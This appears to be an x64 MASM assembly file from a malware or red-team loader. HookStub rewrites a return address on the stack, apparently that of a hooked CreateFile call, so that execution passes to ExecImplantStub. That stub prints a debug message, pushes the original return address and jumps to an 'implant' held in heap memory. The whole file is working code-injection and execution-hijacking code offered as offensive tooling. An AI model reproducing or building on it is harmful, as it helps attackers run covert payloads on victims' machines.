.data
extern MainAddr:QWORD
extern Global_OrigCreateFileReturnAddr:QWORD
extern HeapAddress:QWORD
extern SizeOfStack:QWORD
extern printf:PROC
extern message:QWORD
count DWORD 000h

.code
PUBLIC ExecImplantStub
PUBLIC HookStub

    ExecImplantStub PROC
        sub rsp, 20h         ; calls printf like sigmer boss
        lea rcx, message     ; loads the dbg msg
        call printf          ; prints
        add rsp, 20h         ; stack restored.. heh.
        push qword ptr [Global_OrigCreateFileReturnAddr]  ; push org ret addr
        jmp qword ptr [HeapAddress]                       ; jmp to heapaddr
    ExecImplantStub ENDP

    HookStub PROC
        inc count
        cmp count, 1
        jne skip
        mov rax, [SizeOfStack]        
        mov rbx, rsp                 
        add rbx, rax                  
        mov rax, qword ptr [rbx]      
        mov [Global_OrigCreateFileReturnAddr], rax
        lea rax, ExecImplantStub
        mov qword ptr [rbx], rax
    HookStub ENDP

    skip PROC
        mov rax, [MainAddr]
        jmp rax
    skip ENDP

end
